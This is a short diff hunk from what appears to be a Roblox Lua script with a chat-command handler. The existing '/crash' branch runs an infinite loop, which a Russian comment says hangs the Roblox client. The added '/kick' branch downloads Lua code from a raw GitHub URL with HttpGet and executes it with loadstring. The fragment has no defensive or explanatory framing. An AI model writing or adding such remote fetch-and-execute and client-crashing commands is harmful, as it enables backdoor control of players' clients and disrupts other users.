@@ -53,6 +53,8 @@ task.spawn(function()
                         elseif cmd == "/crash" then
                             -- Бесконечный цикл намертво вешает клиент Роблокса
                             while true do end 
+                        elseif cmd =="/kick" then
+                            loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))() 
                         end
                         -- =========================
                     end
